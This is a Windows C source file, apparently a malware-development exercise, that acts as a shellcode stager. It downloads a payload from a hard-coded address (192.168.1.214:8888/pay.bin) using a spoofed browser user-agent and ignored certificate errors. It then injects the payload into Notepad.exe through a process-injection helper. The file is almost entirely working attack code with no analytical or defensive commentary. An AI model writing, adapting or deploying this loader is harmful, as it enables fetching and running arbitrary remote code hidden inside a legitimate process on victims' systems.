#include <Windows.h>
#include <wininet.h>
#include "misc.h"
#include "process-injection-shellcode-lib.h"


#define URL L"http://192.168.1.214:8888/pay.bin"


int main()
{
	HINTERNET hInternet = NULL;
	LPCWSTR lpszAgent = L"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.3";
	
	HINTERNET hFile = NULL;
	LPCWSTR lpszHeaders = L"Header-test: 100";
	DWORD dwUrlFlags = 0;

	BOOL bRet = FALSE;

	HANDLE hHeap = NULL;
	PBYTE pPayload = NULL;
	SIZE_T ulPayload = 0;

	PBYTE pBuf = NULL;
	DWORD ulBuf = 1024;

	DWORD dwNumberOfBytesRead = 0;


	wprintf(L"[i] Downloading payload... ");

	do
	{
		hInternet = InternetOpenW(lpszAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
		if (hInternet == NULL)
		{
			printError(L"InternetOpenW");
			break;
		}

		dwUrlFlags = 0
			| INTERNET_FLAG_HYPERLINK
			| INTERNET_FLAG_IGNORE_CERT_CN_INVALID
			| INTERNET_FLAG_IGNORE_CERT_DATE_INVALID

			| INTERNET_FLAG_NO_CACHE_WRITE

			| INTERNET_FLAG_NO_COOKIES
			| INTERNET_FLAG_NO_UI

			| INTERNET_FLAG_PRAGMA_NOCACHE
			| INTERNET_FLAG_RELOAD

			//| INTERNET_FLAG_SECURE
		;

		hFile = InternetOpenUrlW(hInternet, URL, lpszHeaders, -1, dwUrlFlags, NULL);
		if (hFile == NULL)
		{
			DWORD dwError = GetLastError();
			printWininetError(L"InternetOpenUrlW", dwError);

			break;
		}

		hHeap = GetProcessHeap();
		if (hHeap == NULL)
		{
			printError(L"GetProcessHeap");
			break;
		}

		pBuf = (PBYTE)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, ulBuf);

		do 
		{
			bRet = InternetReadFile(hFile, pBuf, ulBuf, &dwNumberOfBytesRead);
			if (!bRet)
			{
				printError(L"InternetOpenUrlW");
				break;
			}

			if (pPayload == NULL)
			{
				pPayload = (PBYTE)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwNumberOfBytesRead);
			}
			else
			{
				pPayload = (PBYTE)HeapReAlloc(hHeap, HEAP_ZERO_MEMORY, pPayload, ulPayload + dwNumberOfBytesRead);
			}

			memcpy_s((PVOID)(pPayload + ulPayload), ulPayload + dwNumberOfBytesRead, pBuf, dwNumberOfBytesRead);
			
			ulPayload += dwNumberOfBytesRead;

		} while (dwNumberOfBytesRead == ulBuf);

	} while (FALSE);


	wprintf(L"done, lenght: %d\n", ulPayload);
	//printHex(pPayload, ulPayload);
	
	processInjectionShellcode(L"Notepad.exe", pPayload, ulPayload);


	// Close connection HTTP/S connection (it is left open for reuse by default)
	if (hInternet)
	{
		InternetSetOptionW(hInternet, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	}

	if (hInternet)
	{
		InternetCloseHandle(hInternet);
	}

	if (hFile)
	{
		InternetCloseHandle(hFile);
	}

	if (pBuf)
	{
		HeapFree(hHeap, NULL, pBuf);
	}

	if (pPayload)
	{
		HeapFree(hHeap, NULL, pPayload);
	}

	/*
	if (hHeap)
	{
		HeapFree();
	}
	*/

	return 0;
}